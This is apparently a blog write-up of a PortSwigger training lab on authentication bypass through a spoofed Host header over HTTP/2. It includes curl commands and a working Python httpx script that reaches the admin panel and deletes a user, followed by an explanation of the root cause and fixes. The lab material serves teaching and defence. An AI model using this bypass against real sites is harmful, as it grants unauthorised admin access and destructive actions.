---
layout: post
title: "PortSwigger: Host Header Authentication Bypass"
date: 2027-10-16 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, HostHeader]
tags: [portswigger, host-header, authentication-bypass, http2, authority, access-control, cwe-290]
---

An admin panel that's "only available to local users" again — but this time the server decides you're local by reading the **`Host` header** you sent. The Host header is client-controlled, so "local" is just a string you type. The interesting part is that you can't simply rewrite it: the front-end proxy routes on that same header and slams the door before the app ever runs. The way through is HTTP/2. This is [CWE-290](https://cwe.mitre.org/data/definitions/290.html), Authentication Bypass by Spoofing.

## Overview

`/admin` exists (it's even in `robots.txt`), but a normal request is refused:

```bash
curl -sk 'https://<lab-id>.web-security-academy.net/admin'
#   -> 401 "Admin interface only available to local users"
```

The app treats a request as "local" when its `Host` header is `localhost`. So in principle: set `Host: localhost`, become local, get in.

## Why the obvious move fails

The lab sits behind a front-end proxy that uses the `Host` header to route your request to the right back-end instance. Change `Host` over plain HTTP/1.1 and the proxy can no longer find your instance — it answers before the app does:

```bash
curl -sk --http1.1 'https://<lab-id>.web-security-academy.net/' -H 'Host: localhost'
#   -> 403 Forbidden   (front-end, not the app)
```

A mismatched TLS SNI gets you `421 Misdirected Request`. And `X-Forwarded-Host: localhost` is ignored — this app reads the *real* `Host`. So we need the proxy to keep routing correctly while the application sees `localhost`.

## HTTP/2 splits routing from the app's view

HTTP/2 doesn't use a `Host` header for the target — it uses a pseudo-header called `:authority`. A normal `Host` header can ride alongside it. Crucially:

- the **front-end proxy routes on `:authority`**
- the **back-end app reads `Host`**

So we send `:authority` = the real instance host (routing succeeds) and a separate `Host: localhost` (the app thinks we're local). Both are satisfied at once.

One quirk with the `httpx` client: open the HTTP/2 connection with a clean request first (so `:authority` is negotiated as the real host), then reuse that same connection for the Host-spoofed requests. A brand-new connection whose first request already carries the conflicting `Host` gets dropped with an HTTP/2 GOAWAY.

```python
import httpx
c = httpx.Client(http2=True, verify=False, timeout=20)
c.get("https://<lab-id>.web-security-academy.net/")                       # warm: sets :authority

# now the app sees Host: localhost and lets us in
r = c.get("https://<lab-id>.web-security-academy.net/admin",
          headers={"Host": "localhost"})
#   -> 200, the admin panel (lists users with /admin/delete?username=... links)

# invoke the privileged action directly
d = c.get("https://<lab-id>.web-security-academy.net/admin/delete?username=carlos",
          headers={"Host": "localhost"})
#   -> 302, carlos deleted
```

Deleting `carlos` flips the lab status to **Solved**.

## Why it worked

Access was granted on a **spoofable request attribute** — the `Host` header — rather than on a real, authenticated identity. Anything the client can set is not a trust boundary. The same trusted-Host weakness underlies password-reset poisoning and web cache poisoning; here it's a straight authentication bypass.

## The fix

- Never make a security decision from `Host`, `X-Forwarded-Host`, or `X-Forwarded-For` — treat them as untrusted input.
- Gate admin areas on an **authenticated session and role**, not on where the request appears to come from.
- If "local only" genuinely matters, enforce it at the proxy by real network origin, and reject any request whose `Host` disagrees with the expected value before it reaches the app.
